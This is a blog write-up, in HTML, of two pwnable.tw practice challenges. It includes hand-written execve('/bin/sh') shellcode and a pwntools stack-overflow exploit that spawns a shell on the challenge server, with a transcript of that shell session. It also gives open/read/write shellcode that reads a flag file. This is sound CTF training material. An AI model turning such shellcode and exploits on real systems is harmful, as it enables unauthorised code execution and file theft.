@@ -1,0 +1,503 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  
+    <title>pwnable.tw wp(刚开始...) | p1Kk&#39;s World!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="p1Kk">
+    
+
+    
+    <meta name="description" content="start0x01分析checksec 1234567kk@ubuntu:~/Desktop/black/tw/start$ checksec start [*] &amp;apos;/home/kk/Desktop/black/tw/start/start&amp;apos;    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    No ca">
+<meta name="keywords" content="pwn,wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.tw wp(刚开始...)">
+<meta property="og:url" content="p1Kk.github.io/2019/10/03/tw/tw/index.html">
+<meta property="og:site_name" content="p1Kk&#39;s World!">
+<meta property="og:description" content="start0x01分析checksec 1234567kk@ubuntu:~/Desktop/black/tw/start$ checksec start [*] &amp;apos;/home/kk/Desktop/black/tw/start/start&amp;apos;    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    No ca">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-69db03af34b29b1e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-10-03T02:53:01.703Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwnable.tw wp(刚开始...)">
+<meta name="twitter:description" content="start0x01分析checksec 1234567kk@ubuntu:~/Desktop/black/tw/start$ checksec start [*] &amp;apos;/home/kk/Desktop/black/tw/start/start&amp;apos;    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    No ca">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/17548101-69db03af34b29b1e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+    
+    <link rel="alternative" href="atom.xml" title="p1Kk&#39;s World!" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/site.jpg">
+    
+    
+    <link rel="apple-touch-icon" href="/img/head.png">
+    <link rel="apple-touch-icon-precomposed" href="/img/head.png">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo2.jpg" alt="p1Kk&#39;s World!" title="p1Kk&#39;s World!"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="p1Kk&#39;s World!">p1Kk&#39;s World!</a></h1>
+				<h2 class="blog-motto">艺无止境，功不唐捐。</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:p1Kk.github.io">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2019/10/03/tw/tw/" title="pwnable.tw wp(刚开始...)" itemprop="url">pwnable.tw wp(刚开始...)</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="p1Kk" target="_blank" itemprop="author">p1Kk</a>
+		
+  <p class="article-time">
+    <time datetime="2019-10-03T02:49:08.908Z" itemprop="datePublished"> Published 2019-10-03</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#start"><span class="toc-number">1.</span> <span class="toc-text">start</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01分析"><span class="toc-number">1.1.</span> <span class="toc-text">0x01分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02利用思路"><span class="toc-number">1.2.</span> <span class="toc-text">0x02利用思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#orw"><span class="toc-number">2.</span> <span class="toc-text">orw</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01"><span class="toc-number">2.1.</span> <span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02"><span class="toc-number">2.2.</span> <span class="toc-text">0x02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03"><span class="toc-number">2.3.</span> <span class="toc-text">0x03</span></a></li></ol></li></ol>
+		
+		</div>
+		
+		<h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><h2 id="0x01分析"><a href="#0x01分析" class="headerlink" title="0x01分析"></a>0x01分析</h2><p><strong>checksec</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~/Desktop/black/tw/start$ checksec start </span><br><span class="line">[*] &apos;/home/kk/Desktop/black/tw/start/start&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p><strong>ida</strong><br><img src="https://upload-images.jianshu.io/upload_images/17548101-69db03af34b29b1e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>先调用int 80h的4号程序：<code>sys_write</code><br>再调用int 80h的3号程序：<code>sys_read</code><br>（百度int 80h系统调用号）<br>可以读取0x14字节\</p>
+<h2 id="0x02利用思路"><a href="#0x02利用思路" class="headerlink" title="0x02利用思路"></a>0x02利用思路</h2><p>NX保护未开启，可以写入shellcode<br>【原来总是利用shellcraft生成，这次需要自己写，所以顺便<a href="https://www.jianshu.com/p/eb75426b85cb" target="_blank" rel="noopener">学写shellcode</a>了】<br><strong>程序执行<code>write</code>前没有修改ecx，所以我们第一次先将程序劫持到<code>mov ecx, esp</code>处，则第二次执行程序时，<code>write</code>输出的即是esp地址。执行到<code>read</code>处时，我们将函数返回地址设置为<code>esp + offset</code>，这样可以在栈初始处写入execve(“/bin/sh”)作为shellcode执行。</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~/Desktop/black/tw/start$ vim shellcode.asm</span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">xor    ecx, ecx</span><br><span class="line">mul    ecx</span><br><span class="line">push   ecx</span><br><span class="line">push   &quot;//sh&quot;    ；记得对齐哈...我开始直接push &quot;/sh&quot;是不可以用的</span><br><span class="line">push   &quot;/bin&quot;</span><br><span class="line">mov    ebx, esp</span><br><span class="line">mov    al, 0Bh</span><br><span class="line">int    80h</span><br><span class="line"></span><br><span class="line">kk@ubuntu:~/Desktop/black/tw/start$ nasm -f elf32 shellcode.asm </span><br><span class="line">kk@ubuntu:~/Desktop/black/tw/start$ ld -m elf_i386 -o shellcode shellcode.o</span><br><span class="line">kk@ubuntu:~/Desktop/black/tw/start$ objdump -d shellcode</span><br><span class="line"></span><br><span class="line">shellcode:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">08048060 &lt;_start&gt;:</span><br><span class="line"> 8048060:	31 c9                	xor    %ecx,%ecx</span><br><span class="line"> 8048062:	f7 e1                	mul    %ecx</span><br><span class="line"> 8048064:	51                   	push   %ecx</span><br><span class="line"> 8048065:	68 2f 2f 73 68       	push   $0x68732f2f</span><br><span class="line"> 804806a:	68 2f 62 69 6e       	push   $0x6e69622f</span><br><span class="line"> 804806f:	89 e3                	mov    %esp,%ebx</span><br><span class="line"> 8048071:	b0 0b                	mov    $0xb,%al</span><br><span class="line"> 8048073:	cd 80                	int    $0x80</span><br></pre></td></tr></table></figure>
+
+<p>所以shellcode = “\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x00\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80”</p>
+<p>###0x03exp攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"># context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">io = remote(&quot;chall.pwnable.tw&quot;, 10000)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">addr = 0x08048087</span><br><span class="line"></span><br><span class="line">payload1 = &quot;a&quot; * 0x14 + p32(addr)</span><br><span class="line"></span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">esp_addr = u32(io.recv(4))</span><br><span class="line"></span><br><span class="line">shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span><br><span class="line">payload = &quot;a&quot; * 0x14 + p32(esp_addr+0x14) + shellcode</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~/Desktop/black/tw/start$ python exp.py </span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10000: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">\x00\x00\x006\x1f\xff\xff\x00\x00\x00\x00H\x1f\xff\xff$ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libx32</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">$ find -name flag    ；目录太多了，所以通过name找一下flag所在目录</span><br><span class="line">./home/start/flag</span><br><span class="line">$ cat ./home/start/flag</span><br><span class="line">FLAG&#123;自己试试_口喜口喜&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><blockquote>
+<p>题目要求：<br>Read the flag from /home/orw/flag.<br>Only open <code>read</code> <code>write</code> <code>syscall</code> are allowed to use.</p>
+</blockquote>
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p><strong>checksec</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~/Desktop/black/pwnable.tw/orw$ checksec ./orw </span><br><span class="line">[*] &apos;/home/kk/Desktop/black/pwnable.tw/orw/orw&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<p><strong>ida</strong><br>主要考察编写<strong>shellcode</strong>的能力</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  orw_seccomp();</span><br><span class="line">  printf(&quot;Give my your shellcode:&quot;);</span><br><span class="line">  read(0, &amp;shellcode, 0xC8u);</span><br><span class="line">  ((void (*)(void))shellcode)();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>先用c语言写出来，只能只用write，read，open函数 [ 测试时记得现在本地创立<code>/home/orw/flag</code> ]</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">	int fd;</span><br><span class="line">	char buf[100] = &#123;0&#125;;</span><br><span class="line">	fd = fopen(&quot;/home/orw/flag&quot;, &quot;r&quot;);</span><br><span class="line">	fscanf(fd, &quot;%s&quot;, buf);</span><br><span class="line">	printf(&quot;%s\n&quot;, buf);</span><br><span class="line"></span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line">	return 0;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~/Desktop/black/pwnable.tw/orw$ gcc test.c -o test</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~/Desktop/black/pwnable.tw/orw$ ./test </span><br><span class="line">flag&#123;aaaa&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看汇编</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000400666 &lt;+0&gt;:	push   rbp</span><br><span class="line">   0x0000000000400667 &lt;+1&gt;:	mov    rbp,rsp</span><br><span class="line">   0x000000000040066a &lt;+4&gt;:	add    rsp,0xffffffffffffff80</span><br><span class="line">   0x000000000040066e &lt;+8&gt;:	mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x0000000000400677 &lt;+17&gt;:	mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">   0x000000000040067b &lt;+21&gt;:	xor    eax,eax</span><br><span class="line">   0x000000000040067d &lt;+23&gt;:	lea    rdx,[rbp-0x70]</span><br><span class="line">   0x0000000000400681 &lt;+27&gt;:	mov    eax,0x0</span><br><span class="line">   0x0000000000400686 &lt;+32&gt;:	mov    ecx,0xc</span><br><span class="line">   0x000000000040068b &lt;+37&gt;:	mov    rdi,rdx</span><br><span class="line">   0x000000000040068e &lt;+40&gt;:	rep stos QWORD PTR es:[rdi],rax</span><br><span class="line">   0x0000000000400691 &lt;+43&gt;:	mov    rdx,rdi</span><br><span class="line">   0x0000000000400694 &lt;+46&gt;:	mov    DWORD PTR [rdx],eax</span><br><span class="line">   0x0000000000400696 &lt;+48&gt;:	add    rdx,0x4</span><br><span class="line">   0x000000000040069a &lt;+52&gt;:	mov    edx,0x0</span><br><span class="line">   0x000000000040069f &lt;+57&gt;:	mov    esi,0x0</span><br><span class="line">   0x00000000004006a4 &lt;+62&gt;:	mov    edi,0x4007a4</span><br><span class="line">   0x00000000004006a9 &lt;+67&gt;:	mov    eax,0x0</span><br><span class="line">   0x00000000004006ae &lt;+72&gt;:	call   0x400550 &lt;open@plt&gt;</span><br><span class="line">   0x00000000004006b3 &lt;+77&gt;:	mov    DWORD PTR [rbp-0x74],eax</span><br><span class="line">   0x00000000004006b6 &lt;+80&gt;:	lea    rcx,[rbp-0x70]</span><br><span class="line">   0x00000000004006ba &lt;+84&gt;:	mov    eax,DWORD PTR [rbp-0x74]</span><br><span class="line">   0x00000000004006bd &lt;+87&gt;:	mov    edx,0x64</span><br><span class="line">   0x00000000004006c2 &lt;+92&gt;:	mov    rsi,rcx</span><br><span class="line">   0x00000000004006c5 &lt;+95&gt;:	mov    edi,eax</span><br><span class="line">   0x00000000004006c7 &lt;+97&gt;:	mov    eax,0x0</span><br><span class="line">   0x00000000004006cc &lt;+102&gt;:	call   0x400530 &lt;read@plt&gt;</span><br><span class="line">   0x00000000004006d1 &lt;+107&gt;:	lea    rax,[rbp-0x70]</span><br><span class="line">   0x00000000004006d5 &lt;+111&gt;:	mov    edx,0x64</span><br><span class="line">   0x00000000004006da &lt;+116&gt;:	mov    rsi,rax</span><br><span class="line">   0x00000000004006dd &lt;+119&gt;:	mov    edi,0x1</span><br><span class="line">   0x00000000004006e2 &lt;+124&gt;:	mov    eax,0x0</span><br><span class="line">   0x00000000004006e7 &lt;+129&gt;:	call   0x400500 &lt;write@plt&gt;</span><br><span class="line">   0x00000000004006ec &lt;+134&gt;:	mov    eax,DWORD PTR [rbp-0x74]</span><br><span class="line">   0x00000000004006ef &lt;+137&gt;:	mov    edi,eax</span><br><span class="line">   0x00000000004006f1 &lt;+139&gt;:	mov    eax,0x0</span><br><span class="line">   0x00000000004006f6 &lt;+144&gt;:	call   0x400520 &lt;close@plt&gt;</span><br><span class="line">   0x00000000004006fb &lt;+149&gt;:	mov    eax,0x0</span><br><span class="line">   0x0000000000400700 &lt;+154&gt;:	mov    rsi,QWORD PTR [rbp-0x8]</span><br><span class="line">   0x0000000000400704 &lt;+158&gt;:	xor    rsi,QWORD PTR fs:0x28</span><br><span class="line">   0x000000000040070d &lt;+167&gt;:	je     0x400714 &lt;main+174&gt;</span><br><span class="line">   0x000000000040070f &lt;+169&gt;:	call   0x400510 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x0000000000400714 &lt;+174&gt;:	leave  </span><br><span class="line">   0x0000000000400715 &lt;+175&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<p>这其实没啥用，但是可以简单理解一下<br>总之流程就是，先用open打开文件，再读到指定地址，然后打印出来</p>
+<p>恰好第一题start也是考察shellcode，同样也用到了汇编中的系统调用：<br><strong>int 80h的5号程序：sys_open<br>int 80h的4号程序：sys_write<br>int 80h的3号程序：sys_read</strong><br>（百度int 80h系统调用号）</p>
+<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote(&apos;chall.pwnable.tw&apos;, 10001)</span><br><span class="line"># io = process(&apos;./orw&apos;)</span><br><span class="line"></span><br><span class="line">shellcode = &apos;&apos;&apos;</span><br><span class="line">mov eax,0x5		#open(file,0,0);</span><br><span class="line">xor ecx,ecx</span><br><span class="line">push ecx</span><br><span class="line">push 0x67616c66 </span><br><span class="line">push 0x2f2f2f77 </span><br><span class="line">push 0x726f2f65 </span><br><span class="line">push 0x6d6f682f</span><br><span class="line">mov ebx,esp</span><br><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">int 0x80</span><br><span class="line"></span><br><span class="line">mov eax,0x3		#read(3,file,0x50);</span><br><span class="line">mov ecx, ebx</span><br><span class="line">mov ebx, 0x3</span><br><span class="line">mov edx, 0x50</span><br><span class="line">int 0x80</span><br><span class="line"></span><br><span class="line">mov eax,0x4		#write(1,file,0x50);</span><br><span class="line">mov ebx,0x1</span><br><span class="line">mov edx,0x50</span><br><span class="line">int 0x80</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><code>&#39;&#39;&#39;注释&#39;&#39;&#39;</code>一般用来注释,第一次知道这种用法呢…</p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/oj/">oj</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/pwn/">pwn</a><a href="/tags/wp/">wp</a>
+  </div>
+
+</div>
+
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2019/10/03/redpwnctf ropchain/wp/" title="2019 RedpwnCTF Bronze Ropchain wp">
+  <span>
+  2019 RedpwnCTF Bronze Ropchain wp</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2019/10/03/HITCON Ttaing/HITCON wp/"  title="HITCON-Training WP (Lab1, Lab10, Lab13)">
+ <span>HITCON-Training WP (Lab1, Lab10, Lab13)
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+<div id="authorInfo">
+	
+		<div class="author-img"></div>		
+	
+	<div class="social-info" class="clearfix">
+		
+		<a href="http://weibo.com/https://weibo.com/u/5213203661?refer_flag=0000015010_&amp;from=feed&amp;loc=nickname" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		<a href="https://github.com/https://github.com/p1Kk" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:p1kk_wang@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+
+	</div>
+</div>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/oj/" title="oj">oj<sup>5</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/笔记/" title="笔记">笔记<sup>4</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/pwn/" title="pwn">pwn<sup>9</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/wp/" title="wp">wp<sup>8</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/笔记/" title="笔记">笔记<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/攻防世界/" title="攻防世界">攻防世界<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/AWD/" title="AWD">AWD<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ubuntu18/" title="ubuntu18">ubuntu18<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/C/" title="C++">C++<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="link1's url" target="_blank" title="link1&#39;s name">link1&#39;s name</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+		
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/hsihohuang/kiddochan" target="_blank" title="Kiddochan">Kiddochan</a> © 2019 
+		
+		<a href="/about" target="_blank" title="p1Kk">p1Kk</a>
+		
+		
+		</p>
+</div>
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_uv"> 
+	本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span></footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
